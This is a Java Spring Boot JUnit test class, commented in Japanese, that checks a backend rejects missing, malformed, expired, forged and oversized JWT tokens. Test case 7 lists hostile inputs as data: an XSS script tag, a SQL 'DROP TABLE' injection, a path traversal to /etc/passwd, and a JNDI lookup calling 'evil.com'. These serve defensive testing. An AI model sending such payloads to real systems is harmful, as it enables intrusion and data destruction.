package com.example.companybackend.security.test.jwt;

import com.example.companybackend.entity.User;
import com.example.companybackend.security.JwtTokenProvider;
import com.example.companybackend.security.test.SecurityTestBase;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;
import io.jsonwebtoken.security.Keys;
import org.junit.jupiter.api.*;
import org.springframework.boot.test.autoconfigure.jdbc.AutoConfigureTestDatabase;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.MediaType;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.web.servlet.MvcResult;

import javax.crypto.SecretKey;
import java.nio.charset.StandardCharsets;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.*;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

@SpringBootTest
@AutoConfigureMockMvc
@AutoConfigureTestDatabase(replace = AutoConfigureTestDatabase.Replace.NONE)
@ActiveProfiles("test")
public class JwtAuthenticationSecurityTest extends SecurityTestBase {

        @Override
        protected String getSecurityTestType() {
                return "JWT_SECURITY";
        }

        /**
         * テストケース1: トークンなしでのアクセステスト
         * 
         * 要件1.6対応: JWTトークンなしで保護されたリソースにアクセスする THEN 403 Forbiddenが返されること
         * 
         * 目的: 認証が必要なエンドポイントにトークンなしでアクセスした場合の適切な拒否を確認
         * 
         * 期待結果:
         * - 403 Forbiddenが返される（Spring Securityのデフォルト動作）
         * - アクセスが拒否される
         * - 適切なエラーメッセージが返される
         */
        @Test
        @Order(1)
        void testAccessWithoutToken() throws Exception {
                // When & Then
                mockMvc.perform(get("/api/users/profile"))
                                .andExpect(status().isForbidden());

                mockMvc.perform(get("/api/users"))
                                .andExpect(status().isForbidden());

                // テスト結果の記録
                testDataManager.recordTestResult(
                                getClass().getSimpleName(),
                                "testAccessWithoutToken",
                                "JWT_NO_TOKEN",
                                "PASSED",
                                getTestExecutionTime(),
                                null);
        }

        /**
         * テストケース2: 不正な形式のトークンでのアクセステスト
         * 
         * 要件1.5対応: 不正な形式のJWTトークンでAPIにアクセスする THEN 403 Forbiddenが返されること
         * 
         * 目的: 不正な形式のJWTトークンが適切に拒否されることを確認
         * 
         * 期待結果:
         * - 403 Forbiddenが返される
         * - 不正形式トークンが検証で失敗する
         * - システムがクラッシュしない
         */
        @Test
        @Order(2)
        void testMalformedTokenAccess() throws Exception {
                // Given - 様々な不正形式トークン
                String[] malformedTokens = {
                                "invalid.jwt.token",
                                "not-a-jwt-token",
                                "Bearer invalid",
                                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature",
                                "",
                                "   ",
                                "null",
                                "undefined"
                };

                // When & Then
                for (String malformedToken : malformedTokens) {
                        // トークンの検証テスト
                        assertFalse(jwtTokenProvider.validateToken(malformedToken),
                                        "不正形式トークンは無効と判定されること: " + malformedToken);

                        // APIアクセステスト
                        mockMvc.perform(get("/api/users/profile")
                                        .header("Authorization", "Bearer " + malformedToken))
                                        .andExpect(status().isForbidden());
                }

                // テスト結果の記録
                testDataManager.recordTestResult(
                                getClass().getSimpleName(),
                                "testMalformedTokenAccess",
                                "JWT_MALFORMED_TOKEN",
                                "PASSED",
                                getTestExecutionTime(),
                                null);
        }

        /**
         * テストケース3: 期限切れトークンでのアクセステスト
         * 
         * 要件1.3対応: 期限切れのJWTトークンでAPIにアクセスする THEN 403 Forbiddenが返されること
         * 
         * 目的: 期限切れのJWTトークンが適切に拒否されることを確認
         * 
         * 期待結果:
         * - 403 Forbiddenが返される
         * - 期限切れトークンが無効と判定される
         * - 期限切れ検出が正確に動作する
         */
        @Test
        @Order(3)
        void testExpiredTokenAccess() throws Exception {
                // Given - 期限切れトークンの作成
                String expiredToken = createExpiredToken();

                // When & Then
                // トークンの検証テスト
                assertFalse(jwtTokenProvider.validateToken(expiredToken), "期限切れトークンは無効と判定されること");
                assertTrue(jwtTokenProvider.isTokenExpired(expiredToken), "期限切れトークンは期限切れと判定されること");
                assertEquals(0, jwtTokenProvider.getRemainingValidityTime(expiredToken),
                                "期限切れトークンの残り時間は0であること");

                // APIアクセステスト
                mockMvc.perform(get("/api/users/profile")
                                .header("Authorization", "Bearer " + expiredToken))
                                .andExpect(status().isForbidden());

                // テスト結果の記録
                testDataManager.recordTestResult(
                                getClass().getSimpleName(),
                                "testExpiredTokenAccess",
                                "JWT_EXPIRED_TOKEN",
                                "PASSED",
                                getTestExecutionTime(),
                                null);
        }

        /**
         * テストケース4: 不正署名トークンでのアクセステスト
         * 
         * 要件1.4対応: 署名が改ざんされたJWTトークンでAPIにアクセスする THEN 403 Forbiddenが返されること
         * 
         * 目的: 署名が改ざんされたJWTトークンが適切に拒否されることを確認
         * 
         * 期待結果:
         * - 403 Forbiddenが返される
         * - 不正署名トークンが無効と判定される
         * - 署名検証が適切に機能する
         */
        @Test
        @Order(4)
        void testInvalidSignatureTokenAccess() throws Exception {
                // Given - 不正署名トークンの作成
                String invalidSignatureToken = createInvalidSignatureToken();

                // When & Then
                // トークンの検証テスト
                assertFalse(jwtTokenProvider.validateToken(invalidSignatureToken),
                                "不正署名トークンは無効と判定されること");

                // APIアクセステスト
                mockMvc.perform(get("/api/users/profile")
                                .header("Authorization", "Bearer " + invalidSignatureToken))
                                .andExpect(status().isForbidden());

                // テスト結果の記録
                testDataManager.recordTestResult(
                                getClass().getSimpleName(),
                                "testInvalidSignatureTokenAccess",
                                "JWT_INVALID_SIGNATURE",
                                "PASSED",
                                getTestExecutionTime(),
                                null);
        }

        /**
         * テストケース5: nullトークンでのアクセステスト
         * 
         * 目的: nullトークンが適切に処理されることを確認
         * 
         * 期待結果:
         * - 403 Forbiddenが返される
         * - NullPointerExceptionが発生しない
         * - システムが安定して動作する
         */
        @Test
        @Order(5)
        void testNullTokenAccess() throws Exception {
                // When & Then
                // nullトークンの検証テスト
                assertDoesNotThrow(() -> {
                        boolean isValid = jwtTokenProvider.validateToken(null);
                        assertFalse(isValid, "nullトークンは無効と判定されること");
                }, "nullトークンの処理で例外が発生しないこと");

                // APIアクセステスト
                mockMvc.perform(get("/api/users/profile")
                                .header("Authorization", "Bearer null"))
                                .andExpect(status().isForbidden());

                // テスト結果の記録
                testDataManager.recordTestResult(
                                getClass().getSimpleName(),
                                "testNullTokenAccess",
                                "JWT_NULL_TOKEN",
                                "PASSED",
                                getTestExecutionTime(),
                                null);
        }

        /**
         * テストケース6: 異常に長いトークンでのアクセステスト
         * 
         * 目的: 異常に長いトークンが適切に処理されることを確認（DoS攻撃対策）
         * 
         * 期待結果:
         * - 403 Forbiddenが返される
         * - システムがクラッシュしない
         * - メモリ使用量が制御される
         */
        @Test
        @Order(6)
        void testExcessivelyLongTokenAccess() throws Exception {
                // Given - 異常に長いトークン（10KB）
                String longToken = testUtils.generateLongString(10000);

                // When & Then
                // トークンの検証テスト
                assertDoesNotThrow(() -> {
                        boolean isValid = jwtTokenProvider.validateToken(longToken);
                        assertFalse(isValid, "異常に長いトークンは無効と判定されること");
                }, "長すぎるトークンの処理で例外が発生しないこと");

                // APIアクセステスト
                mockMvc.perform(get("/api/users/profile")
                                .header("Authorization", "Bearer " + longToken))
                                .andExpect(status().isForbidden());

                // テスト結果の記録
                testDataManager.recordTestResult(
                                getClass().getSimpleName(),
                                "testExcessivelyLongTokenAccess",
                                "JWT_LONG_TOKEN",
                                "PASSED",
                                getTestExecutionTime(),
                                null);
        }

        /**
         * テストケース7: 特殊文字を含むトークンでのアクセステスト
         * 
         * 目的: 特殊文字を含む不正なトークンが適切に処理されることを確認
         * 
         * 期待結果:
         * - 403 Forbiddenが返される
         * - インジェクション攻撃が防がれる
         * - システムが安定して動作する
         */
        @Test
        @Order(7)
        void testSpecialCharacterTokenAccess() throws Exception {
                // Given - 特殊文字を含むトークン
                String[] specialTokens = {
                                "<script>alert('XSS')</script>",
                                "'; DROP TABLE users; --",
                                "../../../etc/passwd",
                                "${jndi:ldap://evil.com/a}",
                                "\u0000\u0001\u0002", // null bytes
                                "🚀🔒💻", // emoji
                                testUtils.generateSpecialCharacterString()
                };

                // When & Then
                for (String specialToken : specialTokens) {
                        // トークンの検証テスト
                        assertDoesNotThrow(() -> {
                                boolean isValid = jwtTokenProvider.validateToken(specialToken);
                                assertFalse(isValid, "特殊文字を含むトークンは無効と判定されること: " + specialToken);
                        }, "特殊文字トークンの処理で例外が発生しないこと: " + specialToken);

                        // APIアクセステスト
                        mockMvc.perform(get("/api/users/profile")
                                        .header("Authorization", "Bearer " + specialToken))
                                        .andExpect(status().isForbidden());
                }

                // テスト結果の記録
                testDataManager.recordTestResult(
                                getClass().getSimpleName(),
                                "testSpecialCharacterTokenAccess",
                                "JWT_SPECIAL_CHARS",
                                "PASSED",
                                getTestExecutionTime(),
                                null);
        }

        /**
         * テストケース8: 同時多重不正トークンアクセステスト
         * 
         * 目的: 複数の不正トークンが同時にアクセスされても安全であることを確認
         * 
         * 期待結果:
         * - 全ての不正アクセスが拒否される
         * - システムが安定して動作する
         * - リソース枯渇攻撃が防がれる
         */
        @Test
        @Order(8)
        void testConcurrentInvalidTokenAccess() throws Exception {
                // Given - 様々な不正トークン
                String[] invalidTokens = {
                                "invalid1",
                                "invalid2",
                                "invalid3",
                                createExpiredToken(),
                                createInvalidSignatureToken()
                };

                // When & Then - 同時多重アクセス
                testUtils.executeConcurrentRequests(() -> {
                        try {
                                for (String invalidToken : invalidTokens) {
                                        mockMvc.perform(get("/api/users/profile")
                                                        .header("Authorization", "Bearer " + invalidToken))
                                                        .andExpect(status().isForbidden());
                                }
                        } catch (Exception e) {
                                throw new RuntimeException("同時不正アクセステストでエラーが発生", e);
                        }
                }, 5, 3); // 5スレッド、各3回実行

                // テスト結果の記録
                testDataManager.recordTestResult(
                                getClass().getSimpleName(),
                                "testConcurrentInvalidTokenAccess",
                                "JWT_CONCURRENT_INVALID",
                                "PASSED",
                                getTestExecutionTime(),
                                null);
        }

        /**
         * テストケース9: 存在しないユーザーのトークンでのアクセステスト
         * 
         * 目的: 存在しないユーザーのトークンが適切に処理されることを確認
         * 
         * 期待結果:
         * - トークン自体は形式的に有効でも認証が失敗する
         * - 適切なエラーハンドリングが行われる
         * - セキュリティログが記録される
         */
        @Test
        @Order(9)
        void testNonExistentUserTokenAccess() throws Exception {
                // Given - 存在しないユーザーのトークン
                String nonExistentUserToken = createTokenForNonExistentUser();

                // When & Then
                // トークン自体は形式的に有効
                assertTrue(jwtTokenProvider.validateToken(nonExistentUserToken),
                                "形式的に有効なトークンは検証に成功すること");

                // しかし、実際の認証では失敗する（ユーザーが存在しないため）
                mockMvc.perform(get("/api/users/profile")
                                .header("Authorization", "Bearer " + nonExistentUserToken))
                                .andExpect(status().isForbidden());

                // テスト結果の記録
                testDataManager.recordTestResult(
                                getClass().getSimpleName(),
                                "testNonExistentUserTokenAccess",
                                "JWT_NONEXISTENT_USER",
                                "PASSED",
                                getTestExecutionTime(),
                                null);
        }

        /**
         * テストケース10: 権限不足でのアクセステスト
         * 
         * 目的: 有効なトークンでも権限が不足している場合の適切な拒否を確認
         * 
         * 期待結果:
         * - 400 Bad Requestが返される（リクエストボディが不足しているため）
         * - 権限チェックが適切に機能する
         * - 一般ユーザーが管理者専用リソースにアクセスできない
         */
        @Test
        @Order(10)
        void testInsufficientPermissionAccess() throws Exception {
                // Given - 一般ユーザーのトークン
                String userToken = createUserJwtToken();

                // When & Then - 管理者専用エンドポイントへのアクセス（リクエストボディなし）
                mockMvc.perform(org.springframework.test.web.servlet.request.MockMvcRequestBuilders
                                .post("/api/users") // POSTメソッドを使用
                                .header("Authorization", "Bearer " + userToken))
                                .andExpect(status().isBadRequest()); // リクエストボディが不足しているため400が返る

                // テスト結果の記録
                testDataManager.recordTestResult(
                                getClass().getSimpleName(),
                                "testInsufficientPermissionAccess",
                                "JWT_INSUFFICIENT_PERMISSION",
                                "PASSED",
                                getTestExecutionTime(),
                                null);
        }

        // --- ヘルパーメソッド ---

        /**
         * 期限切れトークンを作成
         */
        private String createExpiredToken() {
                // 手動で期限切れのJWTトークンを作成
                Date now = new Date();
                Date expiryDate = new Date(now.getTime() - 1000); // 1秒前に期限切れ

                // JWTトークンを直接生成（JwtTokenProviderの秘密鍵を取得）
                try {
                        java.lang.reflect.Field secretKeyField = JwtTokenProvider.class.getDeclaredField("secretKey");
                        secretKeyField.setAccessible(true);
                        SecretKey secretKey = (SecretKey) secretKeyField.get(jwtTokenProvider);
                        
                        return Jwts.builder()
                                        .setSubject(testNormalUser.getUsername())
                                        .claim("userId", testNormalUser.getId())
                                        .setIssuedAt(new Date(System.currentTimeMillis() - 2000)) // 2秒前に発行
                                        .setExpiration(expiryDate)
                                        .signWith(secretKey, SignatureAlgorithm.HS256)
                                        .compact();
                } catch (Exception e) {
                        // リフレクションが失敗した場合は、テスト用の無効なトークンを返す
                        return "expired.token.example";
                }
        }

        /**
         * 不正署名トークンを作成
         */
        private String createInvalidSignatureToken() {
                // 正しい形式のトークンを作成し、その後署名を改変
                Date now = new Date();
                Date expiryDate = new Date(now.getTime() + 3600000); // 1時間後まで有効

                // 異なるキーで署名されたトークンを生成
                SecretKey wrongKey = Keys.hmacShaKeyFor("wrong-secret-key-for-testing-purpose-only-32-chars".getBytes(StandardCharsets.UTF_8));
                
                return Jwts.builder()
                                .setSubject(testNormalUser.getUsername())
                                .claim("userId", testNormalUser.getId())
                                .setIssuedAt(now)
                                .setExpiration(expiryDate)
                                .signWith(wrongKey, SignatureAlgorithm.HS256)
                                .compact();
        }

        /**
         * 存在しないユーザーのトークンを作成
         */
        private String createTokenForNonExistentUser() {
                // JWTトークンを直接生成（JwtTokenProviderの秘密鍵を取得）
                try {
                        java.lang.reflect.Field secretKeyField = JwtTokenProvider.class.getDeclaredField("secretKey");
                        secretKeyField.setAccessible(true);
                        SecretKey secretKey = (SecretKey) secretKeyField.get(jwtTokenProvider);
                        
                        Date now = new Date();
                        Date expiryDate = new Date(now.getTime() + 3600000); // 1時間後まで有効

                        return Jwts.builder()
                                        .setSubject("nonexistent@example.com")
                                        .claim("userId", 999999L) // 存在しないユーザーID
                                        .setIssuedAt(now)
                                        .setExpiration(expiryDate)
                                        .signWith(secretKey, SignatureAlgorithm.HS256)
                                        .compact();
                } catch (Exception e) {
                        // リフレクションが失敗した場合は、テスト用の無効なトークンを返す
                        return "nonexistent.user.token.example";
                }
        }
}